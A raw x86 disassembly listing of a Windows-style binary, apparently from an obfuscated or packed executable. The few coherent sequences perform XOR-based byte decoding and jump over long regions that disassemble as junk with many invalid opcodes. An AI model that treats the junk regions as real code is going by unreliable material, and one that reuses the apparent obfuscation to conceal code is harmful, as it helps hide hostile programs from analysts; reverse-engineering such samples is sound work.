  403b12:	mov    ecx,DWORD PTR ds:0x427d0f
  403b18:	dec    ecx
  403b19:	mov    DWORD PTR ds:0x427d0f,ecx
  403b1f:	jmp    0x403ad3
  403b24:	sbb    DWORD PTR ds:0x4292bd,edi
  403b2a:	mov    al,BYTE PTR [ebp-0x1]
  403b2d:	xor    DWORD PTR ds:0x4292b9,0x35da
  403b37:	mov    ecx,DWORD PTR [ebp-0x10]
  403b3a:	xor    DWORD PTR ds:0x4292bd,0x513b
  403b44:	xor    al,0x49
  403b46:	xor    DWORD PTR ds:0x42c89a,0x3273
  403b50:	sub    al,0x35
  403b52:	add    DWORD PTR ds:0x4292a5,0x42759c
  403b5c:	mov    BYTE PTR [ecx],al
  403b5e:	xor    DWORD PTR ds:0x427d17,0x427d07
  403b68:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  403b6f:	jmp    0x403c74
  403b74:	(bad)  
  403b75:	xor    cl,BYTE PTR [edi]
  403b77:	adc    ebx,DWORD PTR [ebx]
  403b79:	in     eax,0xfa
  403b7b:	std    
  403b7c:	add    edi,DWORD PTR [edx-0x2dee38c1]
  403b82:	cmc    
  403b83:	mov    dh,ch
  403b85:	push   es
  403b86:	jl     0x403c04
  403b88:	push   esp
  403b89:	jl     0x403c07
  403b8b:	jl     0x403c06
  403b8d:	dec    edi
  403b8e:	and    ecx,DWORD PTR [esi+0x4ea96b6e]
  403b94:	or     BYTE PTR ds:0xbff4f716,dh
  403b9a:	add    al,0x51
  403b9c:	xor    BYTE PTR [esi+0x47],bh
  403b9f:	pop    esi
  403ba0:	cli    
  403ba1:	(bad)  
  403ba2:	jmp    FWORD PTR [ecx-0x2e]
  403ba5:	xlat   BYTE PTR ds:[ebx]
  403ba6:	out    dx,al
  403ba7:	push   esi
  403ba8:	xchg   DWORD PTR [eax-0x8527e11],ebx
  403bae:	adc    esp,DWORD PTR [edi-0x53db315d]
  403bb4:	mov    WORD PTR [ebp+0xaed0bf0],cs
  403bba:	sbb    DWORD PTR [edi+0x4b],ebp
  403bbd:	(bad)  
  403bbe:	sub    al,0xdd
  403bc0:	cmp    DWORD PTR [ebx],esi
  403bc2:	sti    
  403bc3:	leave  
  403bc4:	imul   esp,ebx,0xffffffde
  403bc7:	retf   
  403bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc9:	imul   esi,DWORD PTR [ecx+0xce0ef58],0xa01c3938
  403bd3:	add    ah,BYTE PTR [edi-0x47]
  403bd6:	enter  0xad58,0xd7
  403bda:	inc    ecx
  403bdb:	popa   
  403bdc:	add    DWORD PTR [edx+ebp*8-0x15130343],ebp
  403be3:	push   edx
  403be4:	dec    ebx
  403be5:	std    
  403be6:	push   0x36
  403be8:	adc    al,0xeb
  403bea:	fsub   DWORD PTR [ebp-0x3a]
  403bed:	cdq    
  403bee:	sbb    al,0xd2
  403bf0:	(bad)  
  403bf1:	xor    BYTE PTR [edx],bl
  403bf3:	mov    ebx,0xe805a34c
  403bf8:	in     al,0x1
  403bfa:	fsub   DWORD PTR [edx-0x59]
  403bfd:	aas    
  403bfe:	jb     0x403b86
  403c00:	addr16 leave 
  403c02:	sbb    al,BYTE PTR [ebp+0x43722d91]
  403c08:	test   BYTE PTR [eax-0x20],0x62
  403c0c:	and    eax,eax
  403c0e:	hlt    
  403c0f:	jo     0x403be9
  403c11:	push   0xffffffe0
  403c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c14:	retf   
  403c15:	or     BYTE PTR [eax+0x55],0x94
  403c19:	cs shl eax,cl
  403c1c:	xor    ecx,DWORD PTR [ecx]
  403c1e:	and    DWORD PTR [ecx-0x64862459],esp
  403c24:	inc    edi
  403c25:	xchg   ebp,eax
  403c26:	push   ss
  403c27:	push   ss
  403c28:	test   DWORD PTR [edx+0x7f],ebx
  403c2b:	jb     0x403c9b
  403c2d:	lahf   
  403c2e:	dec    ecx
  403c2f:	loopne 0x403c7b
  403c31:	aad    0xe7
  403c33:	push   ds
  403c34:	push   edi
  403c35:	mov    bh,0x4c
  403c37:	add    ecx,0x8e534259
  403c3d:	sti    
  403c3e:	pop    ebp
  403c3f:	pop    ecx
  403c40:	scas   eax,DWORD PTR es:[edi]
  403c41:	call   0x3a67:0x2fef5683
  403c48:	add    DWORD PTR [ebp-0x1],0x7281f838
  403c4f:	adc    al,0xa5
  403c51:	push   0x6f4028bf
  403c56:	mov    edx,0x50de601d
  403c5b:	sahf   
  403c5c:	xchg   bl,al
  403c5e:	cs pop ecx
  403c60:	add    al,0x50
  403c62:	inc    eax
  403c63:	loope  0x403c56
  403c65:	lock push esp
  403c67:	rcl    DWORD PTR [eax+0x53],1
  403c6a:	sbb    dl,0xf4
  403c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c6e:	mov    ah,0xb6
  403c70:	cdq    
  403c71:	jge    0x403c03
  403c73:	add    bh,0x45
  403c76:	lock xor al,0x85
  403c79:	pushf  
  403c7a:	clc    
  403c7b:	mov    eax,ds:0x42c8be
  403c80:	mov    ecx,DWORD PTR ds:0x4278bb
  403c86:	sub    eax,ecx
  403c88:	sub    eax,DWORD PTR [eax+ecx*1]
  403c8b:	mov    eax,DWORD PTR [ebp-0x8]
  403c8e:	mov    ecx,0x7510857
  403c93:	push   esi
  403c94:	xor    eax,ecx
  403c96:	movzx  esi,BYTE PTR ds:0x427d03
  403c9d:	sub    DWORD PTR ds:0x4292d9,esi
  403ca3:	jmp    0x403da8
  403ca8:	cld    
  403ca9:	pop    eax
  403caa:	cwde   
  403cab:	daa    
  403cac:	pop    eax
  403cad:	out    0x93,eax
  403caf:	jnp    0x403d22
  403cb1:	or     esp,0x29
  403cb4:	mov    bl,0x17
  403cb6:	xchg   ecx,esi
  403cb8:	(bad)  
  403cb9:	sbb    DWORD PTR [esp+edi*2+0x54],edi
  403cbd:	jl     0x403d3b
  403cbf:	jl     0x403cfc
  403cc1:	pusha  
  403cc2:	cmovle ecx,DWORD PTR [ecx-0x38]
  403cc6:	jbe    0x403c74
  403cc8:	mov    ecx,0xab07bd25
  403ccd:	mov    ebx,0xdca0ef4d
  403cd2:	pop    es
  403cd3:	ins    DWORD PTR es:[edi],dx
  403cd4:	not    DWORD PTR [edx]
  403cd6:	cmp    al,0xad
  403cd9:	popa   
  403cda:	cld    
  403cdb:	pop    eax
  403cdc:	and    edi,ebx
  403cde:	sbb    al,bh
  403ce0:	dec    edi
  403ce1:	or     dl,BYTE PTR [edx-0x5dc37f7a]
  403ce7:	jg     0x403c80
  403ce9:	fwait
  403cea:	sbb    eax,0x230dafa3
  403cef:	loop   0x403d5c
  403cf1:	pushf  
  403cf2:	pushf  
  403cf3:	fwait
  403cf4:	mov    edx,0x4f865ce2
  403cf9:	fmul   QWORD PTR [ebx]
  403cfb:	dec    eax
  403cfc:	shl    ecx,cl
  403cfe:	sub    eax,0x17d90b8f
  403d03:	mov    dl,0x2e
  403d05:	test   eax,0xd2f71d22
  403d0a:	jmp    0x403c9d
  403d0c:	inc    ebp
  403d0d:	add    bl,BYTE PTR [ecx+0x57a78a38]
  403d13:	lods   al,BYTE PTR ds:[esi]
  403d14:	adc    ebp,esp
  403d16:	pop    edx
  403d17:	xchg   dl,bl
  403d19:	push   ebx
  403d1a:	adc    DWORD PTR [edi],edi
  403d1c:	(bad)  
  403d1d:	or     cl,BYTE PTR [edx]
  403d1f:	lahf   
  403d20:	mov    dh,0x18
  403d22:	jae    0x403d32
  403d24:	jge    0x403cd3
  403d26:	and    ebp,edi
  403d28:	pop    esp
  403d29:	popa   
  403d2a:	sub    DWORD PTR [ecx+eax*2],eax
  403d2d:	adc    eax,0x4a948234
  403d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d33:	jl     0x403d36
  403d35:	push   edx
  403d36:	xor    al,0x1e
  403d38:	push   ss
  403d39:	push   ss
  403d3a:	cwde   
  403d3b:	add    DWORD PTR [ebx-0xb],ecx
  403d3e:	push   0xffffffa3
  403d40:	dec    ebx
  403d41:	push   ds
  403d42:	repnz clc 
  403d44:	cmp    BYTE PTR [eax],bh
  403d46:	in     eax,dx
  403d47:	inc    eax
  403d48:	cs pop ecx
  403d4a:	mov    eax,0xb9f2d093
  403d4f:	add    BYTE PTR [eax+0x922d6c3],dh
  403d55:	add    BYTE PTR [ecx+0x45831873],ah
  403d5b:	call   0xa60b9c01
  403d60:	mov    edx,0xa3878082
  403d65:	cmp    BYTE PTR [ecx],0xc0
  403d68:	mov    BYTE PTR [edi+ebx*8+0x2b],ah
  403d6c:	jle    0x403da8
  403d6e:	addr16 shr ah,0xa
  403d72:	inc    edi
  403d73:	jb     0x403d8d
  403d75:	jecxz  0x403d7b
  403d77:	les    eax,FWORD PTR [esi]
  403d79:	push   0x848f22de
  403d7e:	dec    ebx
  403d7f:	and    dh,BYTE PTR [edi+esi*2+0x19]
  403d83:	adc    eax,0xc2a65ec5
  403d88:	test   BYTE PTR [ebp-0x4bfd5e80],dh
  403d8e:	sub    cl,0x97
  403d91:	jae    0x403d3c
  403d93:	psrlq  mm4,mm4
  403d96:	int3   
  403d97:	cmp    ch,BYTE PTR [ecx-0x71051bf5]
  403d9d:	imul   al
  403d9f:	and    bl,BYTE PTR [edx]
  403da1:	test   DWORD PTR [ebp-0x6bae6a26],0x729ebe9b
  403dab:	xor    al,BYTE PTR [eax]
  403dad:	sbb    DWORD PTR ds:0x427598,0x734e
  403db7:	add    eax,esi
  403db9:	mov    DWORD PTR ds:0x4292d9,0x3d2c
  403dc3:	jmp    0x403ee9
  403dc8:	mov    DWORD PTR ds:0x4292d5,0x6a19
  403dd2:	mov    dl,BYTE PTR [ebp-0x1]
  403dd5:	jmp    0x403eda
  403dda:	sub    DWORD PTR [edi+edi*4+0x69d96176],eax
  403de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de2:	sub    al,0x65
  403de4:	sbb    BYTE PTR [esi],ch
  403de6:	test   BYTE PTR [ebp+0x1d],dh
  403de9:	popf   
  403dea:	sbb    BYTE PTR ds:[esp+edi*2+0x54],bh
  403def:	jl     0x403e6d
  403df1:	jl     0x403d86
  403df3:	mov    cl,0xde
  403df5:	jae    0x403e63
  403df7:	inc    esi
  403df8:	sbb    ecx,DWORD PTR [esi+0x22]
  403dfb:	ins    DWORD PTR es:[edi],dx
  403dfc:	js     0x403e21
  403dfe:	rcr    DWORD PTR [ecx+0x6],1
  403e01:	mov    esp,0x88066520
  403e06:	pop    es
  403e07:	and    DWORD PTR [ebp+eax*4+0x3e],ebx
  403e0b:	in     al,0x72
  403e0d:	cmp    BYTE PTR [ebx+0x67],0x67
  403e11:	mov    eax,edx
  403e13:	jp     0x403dbb
  403e15:	lods   al,BYTE PTR ds:[esi]
  403e16:	and    ah,0xab
  403e19:	loopne 0x403df1
  403e1b:	jge    0x403df5
  403e1d:	sbb    al,0x90
  403e1f:	adc    al,0x89
  403e21:	mov    ch,0x4e
  403e23:	jb     0x403e40
  403e25:	das    
  403e26:	mov    dh,0x8e
  403e28:	cwde   
  403e29:	test   al,0x72
  403e2b:	test   BYTE PTR [ebx],0xe4
  403e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e2f:	repz xor eax,0x5f177a7b
  403e35:	add    eax,DWORD PTR [ebp-0xc]
  403e38:	je     0x403e2d
  403e3a:	mov    bl,0x58
  403e3c:	and    DWORD PTR [ebp-0x404b60c5],ebx
  403e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e43:	out    dx,al
  403e44:	mov    bl,BYTE PTR [edi-0x155e468d]
  403e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e4b:	adc    ah,cl
  403e4d:	pop    es
  403e4e:	int3   
  403e4f:	lods   eax,DWORD PTR ds:[esi]
  403e50:	aad    0x64
  403e52:	int3   
  403e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e54:	js     0x403eac
  403e56:	je     0x403e82
  403e58:	aaa    
  403e59:	(bad)
  403e5c:	jp     0x403ded
  403e5e:	add    eax,0xcd631539
  403e63:	addr16 pop eax
  403e65:	repz repz push ecx
  403e68:	mov    edx,0x2f1ea7a0
  403e6d:	ret    
  403e6e:	mov    ebp,0x86cb2b28
  403e73:	inc    ecx
  403e74:	imul   ebp,DWORD PTR [edi+edx*4-0x77ebafb4],0x11a61115
  403e7f:	jecxz  0x403e0d
  403e81:	xor    ebp,DWORD PTR [ebx]
  403e83:	ss ins DWORD PTR es:[di],dx
  403e86:	sub    al,bh
  403e88:	cwde   
  403e89:	je     0x403e17
  403e8b:	aam    0xa2
  403e8d:	xchg   DWORD PTR [edi-0x5c60f6f0],ecx
  403e93:	adc    DWORD PTR [edi+0x106557dd],eax
  403e99:	mov    ?,esi
  403e9b:	jnp    0x403ec4
  403e9d:	jle    0x403eb3
  403e9f:	daa    
  403ea0:	cmp    al,0xae
  403ea2:	pop    es
  403ea3:	sub    BYTE PTR ds:0xb5ba3922,ah
  403ea9:	out    0x5,al
  403eab:	leave  
  403eac:	out    dx,eax
  403ead:	int3   
  403eae:	xor    ch,BYTE PTR [eax]
  403eb0:	sub    al,0x72
  403eb2:	rol    BYTE PTR [edi+ebp*4+0x51],0x4f
  403eb7:	out    dx,eax
  403eb8:	mov    dh,0xd
  403eba:	ins    DWORD PTR es:[edi],dx
  403ebb:	rcr    DWORD PTR [ebp+0x1d10fbfd],cl
  403ec1:	mov    esp,0xbfcf89a
  403ec6:	inc    ebx
  403ec7:	pop    esp
  403ec8:	aam    0xea
  403eca:	inc    ecx
  403ecb:	in     al,0x28
  403ecd:	fbstp  TBYTE PTR [eax+eiz*4-0x8]
  403ed1:	aam    0x68
  403ed3:	enter  0x8b98,0x62
  403ed7:	inc    ebp
  403ed8:	das    
  403ed9:	int    0x88
  403edb:	push   esp
  403edc:	add    eax,0x9805c7a8
  403ee1:	jne    0x403f25
  403ee3:	add    BYTE PTR [edi],cl
  403ee5:	or     al,0x0
  403ee7:	add    BYTE PTR [eax-0x7d],al
  403eea:	clc    
  403eeb:	inc    eax
  403eec:	mov    DWORD PTR ds:0x4292cd,0x3a6f
  403ef6:	jb     0x403dc8
  403efc:	mov    edx,DWORD PTR ds:0x4292e9
  403f02:	mov    edx,DWORD PTR [edx]
  403f04:	xor    DWORD PTR ds:0x427d07,edx
  403f0a:	mov    edx,DWORD PTR [ebp-0x8]
  403f0d:	xor    eax,0x54c0
  403f12:	mov    eax,DWORD PTR [ebp-0xc]
  403f15:	xor    edx,ecx
  403f17:	adc    DWORD PTR ds:0x4275a8,0x4292d1
  403f21:	jmp    0x404026
  403f26:	push   cs
  403f27:	ds add al,0xd
  403f2a:	(bad)  
  403f2b:	fld    QWORD PTR ds:0x74fb2bdd
  403f31:	sub    eax,ecx
  403f33:	mov    ah,0x2a
  403f35:	sub    DWORD PTR [esi],edx
  403f37:	sbb    edi,DWORD PTR [esp+edi*2+0x54]
  403f3b:	jl     0x403fb9
  403f3d:	jl     0x403ef0
  403f3f:	push   ds
  403f40:	adc    ah,cl
  403f42:	retf   
  403f43:	cmp    eax,0xa87546aa
  403f48:	cld    
  403f49:	or     BYTE PTR [edi-0x60],dh
  403f4c:	rcr    BYTE PTR [esp+ebx*8-0x5ef16a3b],cl
  403f53:	jno    0x403f1a
  403f55:	pop    ecx
  403f56:	cmc    
  403f57:	pusha  
  403f58:	aas    
  403f59:	in     eax,0x79
  403f5b:	and    al,0x4a
  403f5d:	mov    ds:0x17e3a333,al
  403f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f63:	adc    ebx,DWORD PTR [ebp-0x5ef2a330]
  403f69:	cmc    
  403f6a:	adc    BYTE PTR [eax],bh
  403f6c:	rcr    DWORD PTR [eax],0x20
  403f6f:	std    
  403f70:	or     BYTE PTR [ebp+edx*8-0x4d1b808b],bh
  403f77:	inc    ebx
  403f78:	dec    edi
  403f79:	cmp    bh,al
  403f7b:	ret    0x3fb5
  403f7e:	lock inc ebx
  403f80:	adc    eax,0x13c4ec10
  403f85:	sub    ebp,DWORD PTR [edx-0x42a6576f]
  403f8b:	mov    bl,0xbb
  403f8d:	push   cs
  403f8e:	xchg   esi,eax
  403f8f:	scas   eax,DWORD PTR es:[edi]
  403f90:	xor    DWORD PTR [ecx],ebx
  403f92:	cmp    ah,ah
  403f94:	addr16 cdq 
  403f96:	iret   
  403f97:	sub    DWORD PTR [ebp+0x35095ff6],ecx
  403f9d:	aad    0x5b
  403f9f:	je     0x403fed
  403fa1:	dec    ebx
  403fa2:	scas   al,BYTE PTR es:[edi]
  403fa3:	adc    BYTE PTR [esi-0x66],bh
  403fa6:	add    al,0x44
  403fa8:	mov    ecx,0xb798d561
  403fad:	sbb    ecx,DWORD PTR [ebx]
  403faf:	jg     0x403fe4
  403fb1:	mov    dh,0xde
  403fb3:	shl    BYTE PTR [ecx+edi*8],cl
  403fb6:	outs   dx,DWORD PTR ds:[esi]
  403fb7:	data16 and al,0x70
  403fba:	not    BYTE PTR [eax]
  403fbc:	hlt    
  403fbd:	(bad)  
  403fbf:	xor    al,BYTE PTR [ebx+edx*1+0x76]
  403fc3:	xor    DWORD PTR [ebx+eiz*1-0x6da8f35a],0x6dd4cb38
  403fce:	xlat   BYTE PTR ds:[ebx]
  403fcf:	sbb    ebx,ecx
  403fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd2:	test   al,0x68
  403fd4:	(bad)  
  403fd5:	pop    ds
  403fd6:	stos   BYTE PTR es:[edi],al
  403fd7:	mov    cl,BYTE PTR [edx]
  403fd9:	cs call 0x4b096d67
  403fdf:	sahf   
  403fe0:	and    dh,BYTE PTR [edi+0x8]
  403fe3:	sbb    eax,0x4af63f04
  403fe8:	dec    ebp
  403fe9:	and    bh,BYTE PTR [ebx-0x74]
  403fec:	lock rcl BYTE PTR [ebp+0x289ebf39],1
  403ff3:	call   0x66e2:0x6e08d4c2
  403ffa:	test   DWORD PTR [ebp-0x19],ebp
  403ffd:	ss xor al,0x78
  404000:	mov    dh,0xaf
  404002:	ds das 
  404004:	ret    0x5895
  404007:	lods   al,BYTE PTR ds:[esi]
  404008:	js     0x404072
  40400a:	jp     0x404039
  40400c:	test   eax,0x74acfefa
  404011:	jge    0x404023
  404013:	cwde   
  404014:	in     eax,dx
  404015:	(bad)  
  404016:	cmpps  xmm1,XMMWORD PTR [esi-0x2c4d9848],0xa7
  40401e:	scas   eax,DWORD PTR es:[edi]
  40401f:	mov    ecx,0x85744f77
  404024:	popf   
  404025:	hlt    
  404026:	add    edx,esi
  404028:	mov    DWORD PTR ds:0x42c88a,0x7aaf
  404032:	cmp    edx,eax
  404034:	mov    DWORD PTR ds:0x4292c1,0x7e3a
  40403e:	je     0x4043e5
  404044:	and    DWORD PTR ds:0x42c88a,0x0
  40404e:	mov    eax,ds:0x42c88a
  404053:	inc    eax
  404054:	mov    ds:0x42c88a,eax
  404059:	cmp    DWORD PTR ds:0x42c88a,0xa
  404060:	jne    0x404071
  404066:	push   0x1f92
  40406b:	call   DWORD PTR ds:0x427c47
  404071:	cmp    DWORD PTR ds:0x42c88a,0x9
  404078:	jne    0x404089
  40407e:	mov    eax,ds:0x42c88a
  404083:	inc    eax
  404084:	mov    ds:0x42c88a,eax
  404089:	cmp    DWORD PTR ds:0x42c88a,0x1a
  404090:	jb     0x40404e
  404096:	push   ebx
  404097:	jmp    0x40419c
  40409c:	mov    fs,WORD PTR [edi]
  40409e:	mov    al,0x47
  4040a0:	ins    DWORD PTR es:[edi],dx
  4040a1:	jnp    0x404040
  4040a3:	stc    
  4040a4:	sbb    al,ch
  4040a6:	(bad)  
  4040a7:	nop
  4040a8:	xor    al,0xe7
  4040aa:	sbb    edx,DWORD PTR [ecx]
  4040ac:	push   cs
  4040ad:	sbb    bh,BYTE PTR [esp+edi*2+0x54]
  4040b1:	jl     0x40412f
  4040b3:	jl     0x4040ee
  4040b5:	jp     0x40411d
  4040b7:	sbb    eax,0xc7406708
  4040bc:	and    bl,BYTE PTR [ebx-0x1f]
  4040bf:	fsub   QWORD PTR [esi-0x32b004c0]
  4040c5:	jl     0x404119
  4040c7:	lds    edi,FWORD PTR [ecx-0x7c]
  4040ca:	mov    DWORD PTR [esi],ebx
  4040cc:	inc    eax
  4040cd:	mov    ds:0xe35796cf,al
  4040d2:	iret   
  4040d3:	je     0x4040b3
  4040d5:	push   0x29919ed8
  4040da:	ss ds xchg ebx,eax
  4040dd:	(bad)
  4040e1:	add    bl,BYTE PTR [edx+ecx*2+0x7d]
  4040e5:	jg     0x4040e2
  4040e7:	cs popf 
  4040e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ea:	(bad)  
  4040eb:	cdq    
  4040ec:	jmp    0x9e7f134
  4040f1:	enter  0xaec9,0x8d
  4040f5:	pop    esi
  4040f6:	jno    0x40411e
  4040f8:	push   ss
  4040f9:	push   ds
  4040fa:	push   0xffffffcf
  4040fc:	push   ss
  4040fd:	jo     0x40417e
  4040ff:	sub    eax,0x76b20d7c
  404104:	pop    esi
  404105:	cmp    al,BYTE PTR [ebx-0x5c]
  404108:	data16 arpl WORD PTR ds:[ecx+0x7d],dx
  40410d:	pop    ss
  40410e:	pop    ebx
  40410f:	dec    ecx
  404110:	and    ecx,edx
  404112:	cmp    BYTE PTR [ecx+0x453fdf4b],dl
  404118:	jns    0x4040ce
  40411a:	fst    st(7)
  40411c:	aas    
  40411d:	in     eax,dx
  40411e:	push   es
  40411f:	cld    
  404120:	jg     0x4040d9
  404122:	xor    eax,0x6e2bbab8
  404127:	std    
  404128:	je     0x4040fb
  40412a:	scas   eax,DWORD PTR es:[edi]
  40412b:	stos   BYTE PTR es:[edi],al
  40412c:	sbb    ecx,DWORD PTR [edx]
  40412e:	aaa    
  40412f:	shl    DWORD PTR [esi+0x1],1
  404132:	mov    ah,0xf2
  404134:	fstp   QWORD PTR [ebx-0xb]
  404137:	test   ah,ah
  404139:	test   DWORD PTR [edx],edi
  40413b:	arpl   dx,ax
  40413d:	ret    0x3e96
  404140:	shl    DWORD PTR [ebx],cl
  404142:	loope  0x4041b6
  404144:	fsub   DWORD PTR [ecx]
  404146:	cmc    
  404147:	mov    edi,0x7aed752f
  40414c:	inc    esi
  40414d:	sahf   
  40414e:	mov    dl,BYTE PTR [eax]
  404150:	iret   
  404151:	pop    esi
  404152:	nop
  404153:	or     ecx,DWORD PTR ds:[edi-0x73e02014]
  40415a:	lock or eax,0x94729052
  404160:	lahf   
  404161:	add    DWORD PTR [ebx+0x7d94f612],esi
  404167:	je     0x404197
  404169:	inc    esi
  40416a:	(bad)  
  40416b:	mov    eax,ds:0x9dcb769
  404170:	call   0xf8b2:0xcae3e9b6
  404177:	popa   
  404178:	fadd   DWORD PTR ds:0x6419850c
  40417e:	sub    al,0xb1
  404180:	lock scas eax,DWORD PTR es:[edi]
  404182:	jmp    0xd2f:0xdbe5c00
  404189:	imul   ebx
  40418b:	loope  0x404132
  40418d:	jae    0x404110
  40418f:	push   esp
  404190:	mov    edx,0xdfec62b6
  404195:	mov    al,0x6b
  404197:	imul   edi
  404199:	stos   BYTE PTR es:[edi],al
  40419a:	xchg   edi,eax
  40419b:	mov    edx,0x87d8b57
  4041a0:	mov    eax,0x8a42
  4041a5:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4041aa:	jmp    0x4042af
  4041af:	sbb    eax,0x673c6c22
  4041b4:	mov    dl,0xbd
  4041b6:	std    
  4041b7:	adc    ah,BYTE PTR [ebx-0x7b94c5f8]
  4041bd:	push   cs
  4041be:	nop
  4041bf:	data16 sbb bh,BYTE PTR [esp+edi*2+0x54]
  4041c4:	jl     0x404242
  4041c6:	jl     0x4041b3
  4041c8:	cmc    
  4041c9:	(bad)  
  4041ca:	cmp    ah,BYTE PTR [ebx+0x680a0371]
  4041d0:	cmp    ch,dl
  4041d2:	adc    DWORD PTR [ebp-0x3d],esi
  4041d5:	cmp    al,BYTE PTR [ecx-0x5e00c520]
  4041db:	imul   ebp,DWORD PTR [esi],0xffffffd1
  4041de:	call   0xfd1f356b
  4041e3:	jp     0x40424c
  4041e5:	in     eax,0x8b
  4041e7:	adc    al,0x1b
  4041e9:	iret   
  4041ea:	pushf  
  4041eb:	dec    eax
  4041ec:	sub    al,BYTE PTR [esi]
  4041ee:	test   al,0xe
  4041f0:	or     al,0x5c
  4041f2:	adc    bl,ch
  4041f4:	sahf   
  4041f5:	mov    bh,0xd3
  4041f7:	mov    dl,0x54
  4041f9:	call   0xf9180747
  4041fe:	aam    0xf9
  404200:	(bad)  
  404201:	ror    BYTE PTR [ebx],0xf4
  404204:	clc    
  404205:	fs pop esi
  404207:	call   0x5f3e:0x842e5cfe
  40420e:	push   edx
  40420f:	out    0xcf,al
  404211:	push   esi
  404212:	cld    
  404213:	inc    esi
  404214:	push   ebp
  404215:	daa    
  404216:	inc    esi
  404217:	cmp    dl,bh
  404219:	cmp    BYTE PTR [esi+0x66],cl
  40421c:	xor    al,0x1f
  40421e:	ins    DWORD PTR es:[edi],dx
  40421f:	sub    eax,DWORD PTR [ecx+0x69]
  404222:	fdivr  DWORD PTR [edx+ebp*4]
  404225:	cmp    eax,0x5cc82d29
  40422a:	lea    ebx,[ecx]
  40422c:	out    dx,al
  40422d:	sbb    BYTE PTR [ebp+0x1d],cl
  404230:	mov    ecx,0x67949dc1
  404235:	iret   
  404236:	or     BYTE PTR ds:0x3f5adb73,al
  40423c:	mov    ch,0x9
  40423e:	ds pop edi
  404240:	pop    edx
  404241:	sbb    eax,0x9a41ccfd
  404246:	and    ecx,edx
  404248:	mov    esi,0x79ec790d
  40424d:	pop    edx
  40424e:	dec    edx
  40424f:	mov    eax,ds:0xb821d8aa
  404254:	jmp    0x2462:0x55598be8
  40425b:	fadd   QWORD PTR [esi+eax*8+0x7cf86011]
  404262:	inc    edx
  404263:	and    ah,bl
  404265:	push   ds
  404266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404267:	js     0x404296
  404269:	out    0x9b,al
  40426b:	imul   DWORD PTR [ecx]
  40426d:	lea    ebp,es:[esi]
  404270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404271:	sub    eax,0xe1234f50
  404276:	or     eax,0x43034250
  40427b:	mov    ch,bl
  40427d:	xchg   ebx,eax
  40427e:	jmp    0x72b8:0x1573b1aa
  404285:	xlat   BYTE PTR ds:[ebx]
  404286:	xchg   edi,eax
  404287:	adc    DWORD PTR [edx-0x6f44d6d],edi
  40428d:	inc    edx
  40428e:	nop
  40428f:	jmp    0x6d1a57b2
  404294:	lods   eax,DWORD PTR ds:[esi]
  404295:	or     BYTE PTR [ecx+0x6c07e70e],0x6
  40429c:	xor    bh,BYTE PTR [edx+eax*8-0x25]
  4042a0:	jne    0x4042a2
  4042a2:	inc    edx
  4042a3:	adc    al,BYTE PTR [ecx+0x50f37b81]
  4042a9:	jae    0x4042a8
  4042ab:	sbb    edi,DWORD PTR [edi+ebp*2+0x7e]
  4042af:	mov    edi,0x3b08
  4042b4:	add    ax,di
  4042b7:	movzx  eax,ax
  4042ba:	mov    DWORD PTR [ebp-0x14],eax
  4042bd:	mov    eax,DWORD PTR [ebp+0x8]
  4042c0:	movzx  eax,WORD PTR [eax+edx*4]
  4042c4:	xor    eax,0x8a42
  4042c9:	add    eax,edi
  4042cb:	mov    edi,DWORD PTR [ebp-0x14]
  4042ce:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4042d2:	mov    eax,DWORD PTR [ebp-0xc]
  4042d5:	inc    edx
  4042d6:	cmp    edx,eax
  4042d8:	jmp    0x4043dd
  4042dd:	daa    
  4042de:	mov    edi,0x79794fe9
  4042e3:	mov    ecx,0xc966f157
  4042e8:	dec    esi
  4042e9:	mov    DWORD PTR ds:0x1d5ec7a8,0x7c547c7c
  4042f3:	jl     0x404371
  4042f5:	(bad)  
  4042f6:	sub    BYTE PTR [ebp-0x57],ah
  4042f9:	pushf  
  4042fa:	xchg   edi,eax
  4042fb:	jnp    0x404322
  4042fd:	aam    0x81
  4042ff:	inc    DWORD PTR [ebp+eax*4-0x3b]
  404303:	in     eax,0x79
  404305:	or     ecx,DWORD PTR [ebp+0x596a4438]
  40430b:	pop    DWORD PTR [edi+0x64d9693f]
  404311:	bound  ebx,QWORD PTR [esi+0x3e]
  404314:	xor    al,0xd1
  404316:	mov    cl,BYTE PTR [ebp+esi*2+0x6e]
  40431a:	pop    esi
  40431b:	imul   esi,DWORD PTR [esp+edi*8],0x5d
  40431f:	mov    cl,0xc8
  404321:	xchg   ecx,eax
  404322:	jae    0x404366
  404324:	shr    DWORD PTR [edi+edx*8+0x79],cl
  404328:	ss push 0x56
  40432b:	jo     0x4042e6
  40432d:	adc    al,BYTE PTR [ecx-0x3d0360b7]
  404333:	mov    edi,0x6452323b
  404338:	cwde   
  404339:	std    
  40433a:	push   esi
  40433c:	call   0xf17a:0xd3c22d68
  404343:	xchg   ebx,eax
  404344:	bound  esi,QWORD PTR [edi]
  404346:	push   ebx
  404347:	(bad)  
  404348:	sub    eax,eax
  40434a:	xchg   esp,eax
  40434b:	xchg   cl,ch
  40434d:	add    DWORD PTR [ecx],esi
  40434f:	cmp    DWORD PTR [edi],esi
  404351:	nop
  404352:	xchg   ebx,eax
  404353:	dec    eax
  404354:	xor    ecx,eax
  404356:	sub    eax,0x9d84d7f3
  40435b:	xor    al,0xa6
  40435d:	sbb    ch,BYTE PTR ds:0x7af87665
  404363:	rcl    DWORD PTR [ecx-0x3823c43e],0x93
  40436a:	push   ecx
  40436b:	xlat   BYTE PTR ds:[ebx]
  40436c:	xchg   esp,eax
  40436d:	and    al,0xa8
  40436f:	and    ebx,DWORD PTR [esi]
